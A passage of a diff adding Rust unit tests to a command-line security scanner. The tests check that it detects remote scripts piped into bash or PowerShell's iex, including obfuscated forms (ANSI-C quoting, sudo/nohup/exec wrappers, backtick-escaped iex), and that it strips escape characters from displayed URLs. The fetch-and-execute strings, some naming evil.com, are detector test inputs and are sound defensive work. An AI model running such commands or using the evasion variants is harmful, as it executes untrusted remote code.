+            normalize_cmd_base("$'\\x2fusr\\x2fbin\\x2fbash'", ShellType::Posix),
+            "bash"
+        );
+    }
+
+    #[test]
+    fn test_cmd_base_octal_encoded_path() {
+        // $'\057bin\057bash' → /bin/bash → basename bash
+        assert_eq!(
+            normalize_cmd_base("$'\\057bin\\057bash'", ShellType::Posix),
+            "bash"
+        );
+    }
+
+    #[test]
+    fn test_cmd_base_env_s_value() {
+        // "bash -x" → first word "bash"
+        assert_eq!(normalize_cmd_base("\"bash -x\"", ShellType::Posix), "bash");
+    }
+
+    #[test]
+    fn test_cmd_base_path_with_args() {
+        // "/usr/bin/bash -x" → basename "bash -x" → first word "bash"
+        assert_eq!(
+            normalize_cmd_base("\"/usr/bin/bash -x\"", ShellType::Posix),
+            "bash"
+        );
+    }
+
+    // ── resolve_interpreter_name tests for new patterns ──
+
+    #[test]
+    fn test_resolve_ansi_c_quoted_bash() {
+        let findings = check_default(
+            "curl https://example.com/install.sh | $'bash'",
+            ShellType::Posix,
+        );
+        assert!(
+            findings.iter().any(|f| f.rule_id == RuleId::CurlPipeShell),
+            "should detect ANSI-C quoted bash: {:?}",
+            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_resolve_command_wrapper() {
+        let findings = check_default(
+            "curl https://example.com/install.sh | command bash",
+            ShellType::Posix,
+        );
+        assert!(
+            findings.iter().any(|f| f.rule_id == RuleId::CurlPipeShell),
+            "should detect 'command bash'"
+        );
+    }
+
+    #[test]
+    fn test_resolve_exec_a_wrapper() {
+        let findings = check_default(
+            "curl https://example.com/install.sh | exec -a myname bash",
+            ShellType::Posix,
+        );
+        assert!(
+            findings.iter().any(|f| f.rule_id == RuleId::CurlPipeShell),
+            "should detect 'exec -a myname bash'"
+        );
+    }
+
+    #[test]
+    fn test_resolve_nohup_wrapper() {
+        let findings = check_default(
+            "curl https://example.com/install.sh | nohup bash",
+            ShellType::Posix,
+        );
+        assert!(
+            findings.iter().any(|f| f.rule_id == RuleId::CurlPipeShell),
+            "should detect 'nohup bash'"
+        );
+    }
+
+    #[test]
+    fn test_resolve_wrapper_chain() {
+        let findings = check_default(
+            "curl https://example.com/install.sh | command sudo bash",
+            ShellType::Posix,
+        );
+        assert!(
+            findings.iter().any(|f| f.rule_id == RuleId::CurlPipeShell),
+            "should detect wrapper chain 'command sudo bash'"
+        );
+    }
+
+    #[test]
+    fn test_resolve_case_insensitive() {
+        let findings = check_default(
+            "curl https://example.com/install.sh | BASH",
+            ShellType::Posix,
+        );
+        assert!(
+            findings.iter().any(|f| f.rule_id == RuleId::CurlPipeShell),
+            "should detect uppercase BASH"
+        );
+    }
+
+    #[test]
+    fn test_resolve_powershell_backtick_iex() {
+        let findings = check_default(
+            "iwr https://evil.com/script.ps1 | `i`e`x",
+            ShellType::PowerShell,
+        );
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::PipeToInterpreter),
+            "should detect PowerShell backtick-escaped iex"
+        );
+    }
+
+    // --- Remediation hint tests ---
+
+    #[test]
+    fn test_pipe_to_interpreter_hint_with_url() {
+        let input = "curl https://example.com/install.sh | bash";
+        let segments = tokenize::tokenize(input, ShellType::Posix);
+        let mut findings = Vec::new();
+        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        assert_eq!(findings.len(), 1);
+        assert!(
+            findings[0]
+                .description
+                .contains("https://example.com/install.sh"),
+            "should include extracted URL in hint"
+        );
+        assert!(
+            findings[0].description.contains("getvet.sh"),
+            "should mention vet"
+        );
+        if cfg!(unix) {
+            assert!(
+                findings[0].description.contains("tirith run"),
+                "Unix builds should suggest tirith run"
+            );
+        }
+    }
+
+    #[test]
+    fn test_pipe_to_interpreter_hint_quoted_url() {
+        let input = r#"curl "https://example.com/install.sh" | bash"#;
+        let segments = tokenize::tokenize(input, ShellType::Posix);
+        let mut findings = Vec::new();
+        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        assert_eq!(findings.len(), 1);
+        assert!(
+            findings[0]
+                .description
+                .contains("https://example.com/install.sh"),
+            "should extract URL from quoted arg"
+        );
+    }
+
+    #[test]
+    fn test_pipe_to_interpreter_hint_flag_equals_url() {
+        let input = "curl --url=https://example.com/install.sh | bash";
+        let segments = tokenize::tokenize(input, ShellType::Posix);
+        let mut findings = Vec::new();
+        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        assert_eq!(findings.len(), 1);
+        assert!(
+            findings[0]
+                .description
+                .contains("https://example.com/install.sh"),
+            "should extract URL from --flag=value"
+        );
+    }
+
+    #[test]
+    fn test_pipe_to_interpreter_no_hint_for_cat() {
+        let input = "cat /tmp/script.sh | bash";
+        let segments = tokenize::tokenize(input, ShellType::Posix);
+        let mut findings = Vec::new();
+        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        assert_eq!(findings.len(), 1);
+        assert!(
+            !findings[0].description.contains("getvet.sh"),
+            "non-fetch source should NOT get vet hint"
+        );
+        assert!(
+            !findings[0].description.contains("tirith run"),
+            "non-fetch source should NOT get tirith run hint"
+        );
+    }
+
+    #[test]
+    fn test_dashdash_stops_flag_skipping() {
+        // "command -- -x" should treat -x as the command, not a flag
+        let input = "curl https://example.com/install.sh | command -- bash";
+        let segments = tokenize::tokenize(input, ShellType::Posix);
+        let mut findings = Vec::new();
+        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        assert_eq!(findings.len(), 1, "should detect bash after --");
+    }
+
+    #[test]
+    fn test_sudo_dashdash_resolves_command() {
+        // "sudo -- bash" should resolve to bash (-- ends sudo's options)
+        let input = "curl https://example.com/install.sh | sudo -- bash";
+        let segments = tokenize::tokenize(input, ShellType::Posix);
+        let mut findings = Vec::new();
+        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        assert_eq!(findings.len(), 1, "should detect bash after sudo --");
+        assert!(
+            findings[0].description.contains("interpreter 'bash'"),
+            "should resolve to bash: {}",
+            findings[0].description
+        );
+    }
+
+    #[test]
+    fn test_ansic_quoting_not_applied_to_fish() {
+        // Fish doesn't support $'...' — it should be treated as literal $
+        assert_eq!(normalize_shell_token("$'bash'", ShellType::Fish), "$bash");
+        // But POSIX should strip the $'...' wrapper
+        assert_eq!(normalize_shell_token("$'bash'", ShellType::Posix), "bash");
+    }
+
+    #[test]
+    fn test_powershell_doubled_single_quote() {
+        // PowerShell: '' inside single quotes is an escaped literal '
+        assert_eq!(
+            normalize_shell_token("'it''s'", ShellType::PowerShell),
+            "it's"
+        );
+        // POSIX: '' ends and reopens — produces empty join
+        assert_eq!(normalize_shell_token("'it''s'", ShellType::Posix), "its");
+    }
+
+    #[test]
+    fn test_sudo_combined_short_flags() {
+        // sudo -iu root bash: -iu means -i -u, where -u takes "root" as value
+        let input = "curl https://example.com/install.sh | sudo -iu root bash";
+        let segments = tokenize::tokenize(input, ShellType::Posix);
+        let mut findings = Vec::new();
+        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        assert_eq!(
+            findings.len(),
+            1,
+            "should detect pipe to bash through sudo -iu root"
+        );
+        assert!(
+            findings[0].description.contains("interpreter 'bash'"),
+            "should resolve to bash, not root: {}",
+            findings[0].description
+        );
+    }
+
+    #[test]
+    fn test_pipe_to_interpreter_hint_iwr_powershell() {
+        let input = "iwr https://evil.com/script.ps1 | iex";
+        let segments = tokenize::tokenize(input, ShellType::PowerShell);
+        let mut findings = Vec::new();
+        check_pipe_to_interpreter(&segments, ShellType::PowerShell, &mut findings);
+        assert_eq!(findings.len(), 1);
+        assert!(
+            findings[0].description.contains("getvet.sh"),
+            "iwr (PowerShell fetch) should get vet hint"
+        );
+        assert!(
+            !findings[0].description.contains("tirith run"),
+            "PowerShell fetch should NOT suggest tirith run"
+        );
+    }
+
+    #[test]
+    fn test_pipe_to_interpreter_hint_sanitizes_ansi_in_url() {
+        // \x1b[31m is an ANSI "red" escape — must be stripped from hint
+        let input = "curl https://example.com/\x1b[31mred | bash";
+        let segments = tokenize::tokenize(input, ShellType::Posix);
+        let mut findings = Vec::new();
+        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        assert_eq!(findings.len(), 1);
+        assert!(
+            !findings[0].description.contains('\x1b'),
+            "ANSI escape must be stripped from hint URL: {}",
+            findings[0].description
+        );
+        assert!(
+            findings[0]
+                .description
+                .contains("https://example.com/[31mred"),
+            "URL should be present minus the ESC byte: {}",
+            findings[0].description
+        );
+    }
+
+    #[test]
+    fn test_pipe_to_interpreter_hint_sanitizes_newline_in_url() {
+        // Newline in URL arg could spoof extra output lines
+        let input = "curl \"https://example.com/\nFAKE: safe\" | bash";
+        let segments = tokenize::tokenize(input, ShellType::Posix);
+        let mut findings = Vec::new();
+        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        assert_eq!(findings.len(), 1);
+        // The \n must be stripped — "FAKE" collapses onto the URL, not a separate line
+        let hint_line = findings[0]
+            .description
+            .lines()
+            .find(|l| l.contains("Safer:"))
+            .expect("should have hint line");
+        assert!(
+            hint_line.contains("example.com/FAKE"),
+            "newline stripped, FAKE should be part of the URL on the hint line: {hint_line}"
+        );
+        // Verify no line starts with "FAKE" (would indicate injection)
+        assert!(
+            !findings[0]
+                .description
+                .lines()
+                .any(|l| l.starts_with("FAKE")),
+            "newline injection must not create a spoofed output line: {}",
+            findings[0].description
+        );
+    }
+
+    #[test]
+    fn test_sanitize_url_for_display() {
+        assert_eq!(
+            sanitize_url_for_display("https://ok.com/path"),
+            "https://ok.com/path"
+        );
+        assert_eq!(
+            sanitize_url_for_display("https://evil.com/\x1b[31mred\x1b[0m"),
+            "https://evil.com/[31mred[0m"
+        );
+        assert_eq!(
+            sanitize_url_for_display("https://evil.com/\n\rspoof"),
+            "https://evil.com/spoof"
+        );
+        assert_eq!(
+            sanitize_url_for_display("https://evil.com/\x07bell\x00null"),
+            "https://evil.com/bellnull"
+        );
+    }
+
+    #[test]
+    fn test_source_command_arrays_consistent() {
+        // is_source_command is composed from the three const arrays.
+        // Verify all arrays contribute and is_source_command rejects unknowns.
+        for cmd in POSIX_FETCH_COMMANDS {
+            assert!(
+                is_source_command(cmd),
+                "POSIX_FETCH entry '{cmd}' not recognized"
+            );
+            assert!(
+                is_url_fetch_command(cmd),
+                "POSIX_FETCH entry '{cmd}' not in fetch union"
+            );
+        }
+        for cmd in POWERSHELL_FETCH_COMMANDS {
+            assert!(
+                is_source_command(cmd),
+                "PS_FETCH entry '{cmd}' not recognized"
+            );
+            assert!(
+                is_url_fetch_command(cmd),
+                "PS_FETCH entry '{cmd}' not in fetch union"
+            );
+        }
+        for cmd in NON_FETCH_SOURCE_COMMANDS {
+            assert!(
+                is_source_command(cmd),
+                "NON_FETCH entry '{cmd}' not recognized"
+            );
+            assert!(
+                !is_url_fetch_command(cmd),
+                "NON_FETCH entry '{cmd}' should not be in fetch union"
+            );
+        }
+        assert!(
+            !is_source_command("cat"),
+            "cat should not be a source command"
         );
     }
 }
